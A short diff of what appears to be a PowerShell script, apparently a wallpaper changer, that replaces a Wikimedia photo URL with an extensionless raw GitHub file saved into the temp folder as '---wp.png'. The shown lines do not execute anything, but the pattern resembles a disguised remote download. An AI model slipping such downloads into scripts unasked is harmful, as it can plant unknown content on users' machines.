@@ -1,4 +1,4 @@
-$url = "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/2014-09-12_-_Vitali_Klitschko_-_9019.jpg/458px-2014-09-12_-_Vitali_Klitschko_-_9019.jpg"
+$url = "https://raw.githubusercontent.com/malvinaro/repo/main/nomaine"
 
 $wp = "$Env:tmp\---wp.png"
 
